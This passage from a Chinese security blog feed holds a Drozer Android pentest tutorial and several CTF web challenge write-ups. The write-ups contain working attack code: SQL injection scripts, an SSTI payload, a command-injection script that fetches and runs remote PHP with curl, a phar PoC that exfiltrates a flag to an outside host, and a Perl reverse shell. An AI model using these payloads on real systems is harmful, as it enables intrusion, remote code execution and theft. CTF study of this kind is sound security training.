size[0], size[1]    print(f&quot;width: &#123;width&#125;, height: &#123;height&#125;&quot;)    width_len, height_len = int(width_len), int(height_len)    width_length, height_length = width_len, height_len    sum_width, sum_height = width * width_length, height * height_length    joint = Image.new(&#39;RGB&#39;, (sum_width, sum_height))    index = 0    for row in range(height_length):        for col in range(width_length):            joint.paste(Image.open(&quot;img//&quot; + str(index) + &quot;.png&quot;), (col * width, row * height))            index += 1    joint.save(result)    Image.open(result).show() </code></pre><p><img src="https://i.loli.net/2020/05/11/1LopmHTJ8Gb5cxQ.png" alt="image-20200511120509584.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drozer 入门</title>
      <link href="/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/"/>
      <url>/2020/03/25/Drozer-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Drozer 工具入门</p><span id="more"></span><h2 id="Drozer-安卓渗透"><a href="#Drozer-安卓渗透" class="headerlink" title="Drozer 安卓渗透"></a>Drozer 安卓渗透</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>win10 + Python2.7</p><h3 id="模拟器"><a href="#模拟器" class="headerlink" title="模拟器"></a>模拟器</h3><p><a href="https://www.yeshen.com/cn/download/fullPackage">夜神模拟器</a></p><h3 id="安装-Drozer"><a href="#安装-Drozer" class="headerlink" title="安装 Drozer"></a>安装 Drozer</h3><p><a href="https://labs.f-secure.com/tools/drozer/">下载Drozer</a></p><p><a href="https://adbshell.com/downloads">下载adb</a></p><p><a href="https://ibotpeaches.github.io/Apktool/install/">下载apktool</a></p><p><a href="https://sourceforge.net/projects/dex2jar/">下载dex2jar</a></p><p><a href="https://github.com/java-decompiler/jd-gui/releases">下载jd-gui</a></p><h3 id="模拟器安装-Drozer"><a href="#模拟器安装-Drozer" class="headerlink" title="模拟器安装 Drozer"></a>模拟器安装 Drozer</h3><p>直接把下载的 agent.apk 拖到模拟器开启就行</p><p><img src="https://i.loli.net/2020/03/25/q5lbu8ojfRL2GkY.png" alt="image-20200325151151218.png"></p><h3 id="本地开启-Drozer"><a href="#本地开启-Drozer" class="headerlink" title="本地开启 Drozer"></a>本地开启 Drozer</h3><h4 id="连接模拟器端口"><a href="#连接模拟器端口" class="headerlink" title="连接模拟器端口"></a>连接模拟器端口</h4><p>这里的62001是夜神模拟器使用的端口</p><pre><code>adb connect 127.0.0.1:62001</code></pre><p>其他模拟器端口参考如下</p><table><thead><tr><th>模拟器名称</th><th>连接默认端口</th></tr></thead><tbody><tr><td>夜神安卓模拟器</td><td>62001</td></tr><tr><td>逍遥安卓模拟器</td><td>21503</td></tr><tr><td>BlueStacks(蓝叠安卓模拟器)</td><td>5555</td></tr><tr><td>雷电安卓模拟器</td><td>5555</td></tr><tr><td>天天安卓模拟器</td><td>6555</td></tr><tr><td>网易MuMu(安卓模拟器)</td><td>7555</td></tr><tr><td>安卓模拟器大师</td><td>54001</td></tr></tbody></table><h4 id="查看连接连接状态"><a href="#查看连接连接状态" class="headerlink" title="查看连接连接状态"></a>查看连接连接状态</h4><pre><code>adb devices</code></pre><h4 id="进入安卓-shell"><a href="#进入安卓-shell" class="headerlink" title="进入安卓 shell"></a>进入安卓 shell</h4><pre><code>adb shell</code></pre><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>把安卓的41415端口转发到本机的41415端口</p><pre><code>adb forward tcp:31415 tcp:31415</code></pre><h4 id="连接-Drozer"><a href="#连接-Drozer" class="headerlink" title="连接 Drozer"></a>连接 Drozer</h4><pre><code>drozer console connect</code></pre><p><img src="https://i.loli.net/2020/03/25/B91X6Ld3pc7sy4u.png" alt="image-20200325151823660.png"></p><h3 id="Drozer-测试步骤"><a href="#Drozer-测试步骤" class="headerlink" title="Drozer 测试步骤"></a>Drozer 测试步骤</h3><h4 id="获取包名"><a href="#获取包名" class="headerlink" title="获取包名"></a>获取包名</h4><p>-f 后面跟 apk 的名字，这里以 sieve.apk 为例子</p><pre><code>run app.package.list -f sieve</code></pre><h4 id="获取包的基本信息"><a href="#获取包的基本信息" class="headerlink" title="获取包的基本信息"></a>获取包的基本信息</h4><pre><code>run app.package.info -a com.mwr.example.sieve</code></pre><h4 id="确定攻击面"><a href="#确定攻击面" class="headerlink" title="确定攻击面"></a>确定攻击面</h4><pre><code>run app.package.attacksurface com.mwr.example.sieve</code></pre><h4 id="Acitivity"><a href="#Acitivity" class="headerlink" title="Acitivity"></a>Acitivity</h4><h5 id="获取-Activity-信息"><a href="#获取-Activity-信息" class="headerlink" title="获取 Activity 信息"></a>获取 Activity 信息</h5><pre><code>run app.activity.info -a com.mwr.example.sieve</code></pre><h5 id="启动-activity"><a href="#启动-activity" class="headerlink" title="启动 activity"></a>启动 activity</h5><pre><code>run app.activity.start --component com.mwr.example.sieve 活动名称</code></pre><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><h5 id="获取-Content-Provider-信息"><a href="#获取-Content-Provider-信息" class="headerlink" title="获取 Content Provider 信息"></a>获取 Content Provider 信息</h5><pre><code>run app.provider.info -a com.mwr.example.sieve</code></pre><h5 id="检测目录遍历漏洞"><a href="#检测目录遍历漏洞" class="headerlink" title="检测目录遍历漏洞"></a>检测目录遍历漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="检测-SQL-注入漏洞"><a href="#检测-SQL-注入漏洞" class="headerlink" title="检测 SQL 注入漏洞"></a>检测 SQL 注入漏洞</h5><pre><code>run scanner.provider.traversal -a com.mwr.example.sieve</code></pre><h5 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h5><p>爆破 uri</p><pre><code>run scanner.provider.finduris -a com.mwr.example.sieve</code></pre><p>查询 uri</p><pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</code></pre><h5 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h5><pre><code>run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;</code></pre><h5 id="系统文件访问"><a href="#系统文件访问" class="headerlink" title="系统文件访问"></a>系统文件访问</h5><pre><code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code></pre><h5 id="系统文件下载"><a href="#系统文件下载" class="headerlink" title="系统文件下载"></a>系统文件下载</h5><pre><code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data /data/com.mwr.example.sieve/databases/database.db /home/user/database.db</code></pre><h4 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h4><h5 id="获取-Broadacast-信息"><a href="#获取-Broadacast-信息" class="headerlink" title="获取 Broadacast 信息"></a>获取 Broadacast 信息</h5><pre><code>run app.broadcast.info -a com.icenta.sudoku.ui</code></pre><h5 id="空-action-攻击"><a href="#空-action-攻击" class="headerlink" title="空 action 攻击"></a>空 action 攻击</h5><pre><code>run app.broadcast.send --component com.icenta.sudoku.ui com.heyzap.sdk.ads.PackageAddedReceiver</code></pre><h5 id="空-extras-攻击"><a href="#空-extras-攻击" class="headerlink" title="空 extras 攻击"></a>空 extras 攻击</h5><p>这里的 action 需要查看反编译的 AndroidManifest.xml 文件，找出 receiver 对应 的 action</p><p><img src="https://i.loli.net/2020/03/25/f3G4uYmxsiaUZgK.png" alt="image-20200325164738846.png"></p><pre><code>run app.broadcast.send --action android.intent.action.PACKAGE_ADDED</code></pre><h4 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h4><h5 id="获取-Service-信息"><a href="#获取-Service-信息" class="headerlink" title="获取 Service 信息"></a>获取 Service 信息</h5><pre><code>run app.service.info -a com.mwr.example.sieve</code></pre><h5 id="权限提升（未试验）"><a href="#权限提升（未试验）" class="headerlink" title="权限提升（未试验）"></a>权限提升（未试验）</h5><pre><code>run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 1 --extra string text 1 --extra string OP SEND_SMS</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 GYXCTF Web</title>
      <link href="/2020/03/18/2020-GYXCTF-Web/"/>
      <url>/2020/03/18/2020-GYXCTF-Web/</url>
      
        <content type="html"><![CDATA[<p>师傅们出的题目都挺有意思</p><p>自己还是有很大差距</p><span id="more"></span><h2 id="dooog"><a href="#dooog" class="headerlink" title="dooog"></a>dooog</h2><p>下载源文件后查看主要有三个站，分别是 client 端、cmd_server 端和 kdc 端，下面是我整理三个文件夹逻辑，随缘看一下。</p><pre><code class="python"># cmd_server/app.pyflag = os.system(&quot;curl http://xxxxxx/`readflag`&quot;)1. os.system(msg[2])2. username == msg[1]3. username = cryptor.decrypt(base64.b64decode(authenticator))4. authenticator = request.form.get(&#39;authenticator&#39;)5. msg = cryptor.decrypt(base64.b64decode(server_message)).split(&#39;|&#39;)6. server_message = request.form.get(&#39;server_message&#39;)# client/app.py1. res = requests.post(&#39;http://cmd_server:5002/cmd&#39;, data=&#123;&#39;server_message&#39;: server_message, &#39;authenticator&#39;: authenticator&#125;)2. client_message, server_message = res.content.split(&#39;|&#39;)3. res = requests.post(&#39;http://kdc:5001/getTicket&#39;,  data=&#123;&#39;username&#39;: username, &#39;cmd&#39;: cmd, &#39;authenticator&#39;: base64.b64encode(authenticator), &#39;TGT&#39;: session[&#39;TGT&#39;]&#125;)4. authenticator = cryptor.encrypt(json.dumps(&#123;&#39;username&#39;: username, &#39;timestamp&#39;: int(time.time())&#125;))5. username = form.username.data6. session[&#39;session_key&#39;], session[&#39;TGT&#39;] = cryptor.decrypt(base64.b64decode(res.content.split(&#39;|&#39;)[0])), res.content.split(&#39;|&#39;)[1]7. res = requests.post(&#39;http://kdc:5001/getTGT&#39;, data=&#123;&#39;username&#39;: username, &#39;authenticator&#39;: base64.b64encode(authenticator)&#125;)8. authenticator = cryptor.encrypt(json.dumps(&#123;&#39;username&#39;:username, &#39;timestamp&#39;: int(time.time())&#125;))9. username = form.username.data# kdc/app.py# /getTicket1. return client_message + &#39;|&#39; + server_message2. server_message = base64.b64encode(cryptor.encrypt(session_key + &#39;|&#39; + data[&#39;username&#39;] + &#39;|&#39; + cmd))3. data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))4. authenticator = request.form.get(&#39;authenticator&#39;)-------------------------# /getTGT1. return session_key_enc + &#39;|&#39; + TGT2. TGT = base64.b64encode(cryptor.encrypt(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time()))))3. data[&#39;username&#39;] == username4. data = json.loads(cryptor.decrypt(base64.b64decode(authenticator)))5. authenticator = request.form.get(&#39;authenticator&#39;)</code></pre><p>简单来说就是 client 先要注册，然后就去提交命令，提交命令需要经过访问两次 kdc 分别拿到 TGT 和 Ticket 认证身份，然后交给 cmd_server 执行，但是 cmd 限制在以下的代码里面了</p><pre><code class="python"># kdc/app.py@app.route(&#39;/getTicket&#39;, methods=[&#39;POST&#39;])def Ticket_vender():    ......     if data[&#39;username&#39;] == auth_data[0] == username:        if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60:            if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]:                return &#39;cmd error&#39;    ......</code></pre><p>然后这里就很有意思，如果不进入这个时间判断，就可以执行任何命令了，而且不会报任何错误，不得了。回去 client/app.py 看以下会有这么一段代码</p><pre><code class="python">if res.content == &#39;time error&#39;:    flash(&#39;time error&#39;)    return redirect(url_for(&#39;index&#39;))</code></pre><p> 这个其实是个虚假 error，其实根本不存在 time error，所以最后的 payload 就是在访问 TGT 和 Ticket 中间 sleep(60+) 就可以了。payload： client 文件夹拿过来，把 ip 改一下，然后 app.py a加个 sleep(61)，然后就可以为所欲为了，中间代码太长，就不全放出来了。</p><pre><code class="python">#visit TGS      cryptor = AESCipher(session[&#39;session_key&#39;])      authenticator = cryptor.encrypt(json.dumps(&#123;&#39;username&#39;: username, &#39;timestamp&#39;: int(time.time())&#125;))      print(&quot;sleep!!!!!!!!!!!&quot;)    # &lt;-------      time.sleep(61)               # &lt;-------      res = requests.post(&#39;http://121.37.164.32:5001/getTicket&#39;,  data=&#123;&#39;username&#39;: username, &#39;cmd&#39;: cmd, &#39;authenticator&#39;: base64.b64encode(authenticator), &#39;TGT&#39;: session[&#39;TGT&#39;]&#125;)      if res.content == &#39;time error&#39;:          flash(&#39;time error&#39;)          return redirect(url_for(&#39;index&#39;))</code></pre><h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>由 Y==2020 猜测是 date() 协议，写一个 temper 用 sqlmap 注入</p><pre><code>#!/usr/bin/env python from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies():     pass def tamper(payload, **kwargs):     return payload.replace(&#39;d&#39;, &#39;\\d&#39;).replace(&#39;D&#39;, &#39;\\D&#39;).replace(&#39;j&#39;, &#39;\\j&#39;).replace(&#39;l&#39;, &#39;\\l&#39;).replace(&#39;N&#39;, &#39;\\N&#39;).replace(&#39;S&#39;, &#39;\\S&#39;).replace(&#39;w&#39;, &#39;\\w&#39;).replace(&#39;z&#39;, &#39;\\z&#39;).         replace(&#39;W&#39;, &#39;\\W&#39;).replace(&#39;F&#39;, &#39;\\F&#39;).replace(&#39;m&#39;, &#39;\\m&#39;).replace(&#39;M&#39;, &#39;\\M&#39;).replace(&#39;n&#39;, &#39;\\n&#39;).replace(&#39;t&#39;, &#39;\\t&#39;).replace(&#39;L&#39;, &#39;\\L&#39;).replace(&#39;o&#39;, &#39;\\o&#39;).replace(&#39;Y&#39;, &#39;\\Y&#39;).        replace(&#39;y&#39;, &#39;\\y&#39;).replace(&#39;a&#39;, &#39;\\a&#39;).replace(&#39;A&#39;, &#39;\\A&#39;).replace(&#39;B&#39;, &#39;\\B&#39;).replace(&#39;g&#39;, &#39;\\g&#39;).replace(&#39;G&#39;, &#39;\\G&#39;).replace(&#39;h&#39;, &#39;\\h&#39;).replace(&#39;H&#39;, &#39;\\H&#39;).replace(&#39;i&#39;, &#39;\\i&#39;).        replace(&#39;s&#39;, &#39;\\s&#39;).replace(&#39;u&#39;, &#39;\\u&#39;).replace(&#39;e&#39;, &#39;\\e&#39;).replace(&#39;I&#39;, &#39;\\I&#39;).replace(&#39;O&#39;, &#39;\\O&#39;).replace(&#39;P&#39;, &#39;\\P&#39;).replace(&#39;T&#39;, &#39;\\T&#39;).replace(&#39;Z&#39;, &#39;\\Z&#39;).replace(&#39;c&#39;, &#39;\\c&#39;).        replace(&#39;r&#39;, &#39;\\r&#39;).replace(&#39;U&#39;, &#39;\\U&#39;)</code></pre><pre><code>sqlmap -u http://121.37.181.246:6333/index.php\?time\=2020 --tamper=escapedate -D trick --dump</code></pre><pre><code>[16:37:52] [INFO] used SQL query returns 1 entryDatabase: trickTable: admin[1 entry]+----+---------------+------------------+----------+| id | url           | passwd           | username |+----+---------------+------------------+----------+| 0  | /eGlhb2xldW5n | 20200202goodluck | admin    |+----+---------------+------------------+----------+</code></pre><p>首先绕过 localhost 读文件，源码有提示 eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</p><pre><code>view-source:http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</code></pre><p>根据源码知道想要得 flag，需要大写然后转为整形，最后用取反绕过就可以了，正则那里则是换行绕过，最后序列化之后扔过去。</p><pre><code>&lt;?phpclass trick&#123; public $gf;&#125;// unserialize((base64_decode($_GET[&#39;code&#39;])));$filename = &quot;FLAG&quot;;$res = &quot;&quot;;for($i = 0; $i &lt; strlen($filename);$i++)&#123;    $res.=strval((ord($filename[$i])));&#125;$gf =  &quot;~&quot;.~$res;$a = new trick();$a-&gt;gf = $gf;$pass = &quot;a.passwd\n20200202&quot;;echo base64_encode(serialize($a));echo &quot;\n&quot;.urlencode($pass);?&gt;</code></pre><h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>参考链接 <a href="https://www.php.net/manual/zh/function.sprintf">https://www.php.net/manual/zh/function.sprintf</a></p><p>覆盖begin获取输出，begin=%1$s</p><p>head=\ 可以取当前域</p><p>只剩下 http 协议，考虑扫描端口</p><pre><code class="python">import requestsfrom multiprocessing import Pool, Managerdef func(i, results):    url = &quot;http://121.37.179.47:1101/&quot;    # print(&quot;[*] now &#123;&#125; &quot;.format(i))    url += &quot;?head=\\&amp;url=telnet://127.0.0.1:&#123;&#125;&amp;begin=%1$s&quot;.format(i)    try:        r = requests.get(url, timeout=2)    except Exception as e:        results.append(i)        print(&quot;[+] find &#123;&#125; !!!&quot;.format(i))if __name__ == &quot;__main__&quot;:    num = 5    data = range(1,65536)    pool = Pool(processes=num)    manager = Manager()    results = manager.list()    jobs = []    for d in data:        job = pool.apply_async(func, (d, results))        jobs.append(job)    pool.close()    pool.join()    print(results)# [80, 7496, 8080, 44590, 50301, 54448, 56332, 56333, 56334, 56335, 56336]  </code></pre><p>发现 8080 有 api，看了看接口 /tmp/{file}，在这里卡了很久，后来发现居然是一个模板注入…确实这里的花括号很有深意。</p><p>找 VIP code</p><pre><code>GET /?head=\&amp;url=http://127.0.0.1:8080/read/file=&#123;file.__class__.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=1&amp;begin=%1$s</code></pre><p>拿了 vip 就可以读文件，读完源码配合字符串逃逸漏洞就可以读 flag 了</p><pre><code>GET /?head=\&amp;url=http://127.0.0.1:8080/read/file=/&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=3l0Y42BOwFQxouc1SH5ZMXTV6nhpAkWrEItmLNsPGfi9aCKz&amp;begin=%1$s</code></pre><h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>代码执行可以用 compress.zlib 协议绕过</p><p><code>compress.zlib://data:@127.0.0.1/baidu.com?,xxx</code></p><p>后面是4个字符的命令执行，可以用 orange 师傅的 wp</p><pre><code>#-*-coding:utf8-*-import requests as rfrom time import sleepimport randomimport hashlibimport requestsfrom urllib import quote, unquotesession = requests.Session()headers = &#123;&quot;Origin&quot;:&quot;http://121.36.222.22:88&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,&quot;Cache-Control&quot;:&quot;max-age=0&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://121.36.222.22:88/core/index.php&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125;cookies = &#123;&quot;PHPSESSID&quot;:&quot;542a952605909d3a8ee9dd21b9163be7&quot;&#125;# 存放待下载文件的公网主机的IPshell_ip = &#39;47.115.44.232&#39;# 将shell_IP转换成十六进制ip = &#39;0x&#39; + &#39;&#39;.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split(&#39;.&#39;)])url = &quot;http://121.36.222.22:88/core/&quot;index_url = url + &quot;index.php/&quot;clear_url = url + &quot;clear.php/&quot;sandbox = url + &quot;sandbox/8d912f274798fa6f987693329d9ac7d9/&quot;# payload某些位置的可选字符pos0 = random.choice(&#39;efgh&#39;)pos1 = random.choice(&#39;hkpq&#39;)pos2 = &#39;g&#39;  # 随意选择字符payload = [    &#39;&gt;dir&#39;,    # 创建名为 dir 的文件    &#39;&gt;%s\&gt;&#39; % pos0,    # 假设pos0选择 f , 创建名为 f&gt; 的文件    &#39;&gt;%st-&#39; % pos1,    # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，    # 因为alphabetical序中t&gt;s    &#39;&gt;sl&#39;,    # 创建名为 &gt;sl 的文件；到此处有四个文件，    # ls 的结果会是：dir f&gt; kt- sl    &#39;*&gt;v&#39;,    # 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，    #  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl    # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符    &#39;&gt;rev&#39;,    # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v    &#39;*v&gt;%s&#39; % pos2,    # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。    # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f    # 续行分割 curl 0x11223344|php 并逆序写入    &#39;&gt;p&#39;,    &#39;&gt;ph\\&#39;,    &#39;&gt;\|\\&#39;,    &#39;&gt;%s\\&#39; % ip[8:10],    &#39;&gt;%s\\&#39; % ip[6:8],    &#39;&gt;%s\\&#39; % ip[4:6],    &#39;&gt;%s\\&#39; % ip[2:4],    &#39;&gt;%s\\&#39; % ip[0:2],    &#39;&gt;\ \\&#39;,    &#39;&gt;rl\\&#39;,    &#39;&gt;cu\\&#39;,    &#39;sh &#39; + pos2,    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行    &#39;sh &#39; + pos0,    # sh f 执行curl命令，下载文件，写入木马。]print payload# clears = session.get(clear_url)print s.text# attackfor i in payload:    paramsPost = &#123;&quot;url&quot;:&quot;compress.zlib://data:@127.0.0.1/baidu.com?,&#123;&#125;&quot;.format(quote(i))&#125;    s = session.post(url, data=paramsPost, headers=headers, cookies=cookies)    print &#39;[%d]&#39; % s.status_code, paramsPost    sleep(0.1)# cmds = session.get(sandbox + &#39;fun.php?cmd=whoami&#39;)print &#39;[%d]&#39; % s.status_code, s.urlprint s.text</code></pre><h2 id="nweb"><a href="#nweb" class="headerlink" title="nweb"></a>nweb</h2><p>一个简单的布尔注入，过滤了 select 和 from，但是可以双写绕过</p><pre><code>from multiprocessing import Pool, Managerimport requestsimport binasciiimport urllib.parse# database ctf-2# version 5.5.59-0ubuntu0.14.04.1# user ctf2@localhost# table admin,fl4g,jd,user# username,pwd,qq# flag&#123;Rogue-MySql-Serverdef func(index, results):    l = 0    r = 127    m = (l+r)//2    while l&lt;r:        session = requests.Session()        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#39;||(ascii((mid((select database()),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#39;||(ascii((mid((seselectlect group_concat(column_name) frofromm information_schema.columns where table_name=&#39;user&#39;),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;        paramsPost = &#123;&quot;flag&quot;:&quot;1&#39;||(ascii((mid((seselectlect flag frofromm fl4g),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;        # paramsPost = &#123;&quot;flag&quot;:&quot;1&#39;||(ascii((mid((seselectlect load_file(&#39;flag.php&#39;)),&#123;&#125;,1)))&gt;&#123;&#125;)\x23&quot;.format(index,m)&#125;        cookies = &#123;&quot;PHPSESSID&quot;:&quot;l6095404o3845i84ofd6fn87r1&quot;,&quot;username&quot;:&quot;21232f297a57a5a743894a0e4a801fc3&quot;&#125;        res = session.post(&quot;http://121.37.179.47:1001/search.php&quot;, data=paramsPost, cookies=cookies, proxies=&#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;)        if &#39;no&#39; in res.text:            r = m            m = (l+r)//2        else:            l = m + 1            m = (l+r)//2    print(index+1, m)    results[index] = mif __name__ == &quot;__main__&quot;:    num = 5    data_num = 40    data = range(data_num)    pool = Pool(processes=num)    manager = Manager()    results = manager.list([0]*data_num)    jobs = []    for d in data:        job = pool.apply_async(func, (d, results))        jobs.append(job)    pool.close()    pool.join()    print(results)    results = &#39;&#39;.join([chr(_) for _ in results])    print(results)</code></pre><h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p>phar 反序列化 + 欺骗服务器</p><pre><code>&lt;?phpclass Fileupload&#123;    public $file;&#125;class Listfile&#123;    public $file;&#125;$a = new Listfile();$a-&gt;file = &quot;/;curl http://47.115.44.232:9001/`/readflag`;&quot;;$b = new Fileupload();$b-&gt;file = $a;$filename = &#39;poc.phar&#39;;file_exists($filename) ? unlink($filename) : null;$phar=new Phar($filename);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($b);$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);$phar-&gt;stopBuffering();?&gt;&lt;!-- rogue_mysql_server  https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py --&gt;&lt;!-- 记得 options 要填 8 因为 MYSQLI_OPT_LOCAL_INFILE == 8 --&gt;</code></pre><h2 id="webtmp"><a href="#webtmp" class="headerlink" title="webtmp"></a>webtmp</h2><p>pickle 反序列化，利用 c 标签覆盖全局变量</p><pre><code>import base64import ioimport sysimport pickleimport secretfrom flask import Flask, Response, render_template, requestclass Animal:    def __init__(self, name, category):        self.name = name        self.category = category    def __repr__(self):        return f&#39;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&#39;    def __eq__(self, other):        return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module == &#39;__main__&#39;:            return getattr(sys.modules[&#39;__main__&#39;], name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding=&#39;utf-8&#39;):    with open(filename, &#39;r&#39;, encoding=encoding) as fin:        return fin.read()payload = b&#39;\x80\x03c__main__\nsecret\n&#125;(Vname\nVrua\nVcategory\nVwww\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x08\x00\x00\x00categoryX\x03\x00\x00\x00wwwub.&#39;pickle_data = base64.b64encode(payload)print(pickle_data)try:    if b&#39;R&#39; in base64.b64decode(pickle_data):        print(&#39;No... I don\&#39;t like R-things. No Rabits, Rats, Roosters or RCEs.&#39;)    else:        result = restricted_loads(base64.b64decode(pickle_data))        if type(result) is not Animal:            print(&#39;Are you sure that is an animal???&#39;)    correct = (result == Animal(secret.name, secret.category))    print(&quot;get flag!!!!&quot;)except Exception as e:    print(repr(e))    print(&quot;Something wrong&quot;)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 V&amp;N CTF Web</title>
      <link href="/2020/03/01/%C2%96%C2%962020-V-N-CTF-Web/"/>
      <url>/2020/03/01/%C2%96%C2%962020-V-N-CTF-Web/</url>
      
        <content type="html"><![CDATA[<p>有很多地方没有转过来，思维过于僵硬，感谢赵师傅出的精美题目</p><span id="more"></span><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>CTFd 的漏洞</p><p>简单来说来说就是注册带空格恶意用户名然后忘记密码进行修改</p><p><a href="https://www.colabug.com/2020/0204/6940556/">https://www.colabug.com/2020/0204/6940556/</a></p><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>找了亿个反弹 shell，下面是有用的一个</p><blockquote><p><a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p></blockquote><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.216.98:9000&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p>系统没有 losf、ps 等进程命令，所以自己逐个去 /proc 找</p><pre><code>app@362cb9dcadd1:/proc$ cd 10app@362cb9dcadd1:/proc/10$ cd fdapp@362cb9dcadd1:/proc/10/fd$ ls -altotal 0dr-x------ 2 app app  0 Feb 29 05:47 .dr-xr-xr-x 9 app app  0 Feb 29 05:43 ..lrwx------ 1 app app 64 Feb 29 05:47 0 -&gt; /dev/nulll-wx------ 1 app app 64 Feb 29 05:47 1 -&gt; &#39;pipe:[421276576]&#39;l-wx------ 1 app app 64 Feb 29 05:47 2 -&gt; &#39;pipe:[421276577]&#39;lr-x------ 1 app app 64 Feb 29 05:47 3 -&gt; &#39;/home/app/flag.txt (deleted)&#39;lrwx------ 1 app app 64 Feb 29 05:47 4 -&gt; &#39;socket:[421292108]&#39;app@362cb9dcadd1:/proc/10/fd$ cat 3flag&#123;85693908-b5aa-4f03-96a8-133fc30854d3&#125;</code></pre><h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>phpinfo 没有读到有用的信息</p><p>读 composer.json 文件根据组件查找 CVE</p><pre><code>&#123;    &quot;require&quot;:&#123;        &quot;guzzlehttp/guzzle&quot;:&quot;6.2.0&quot;    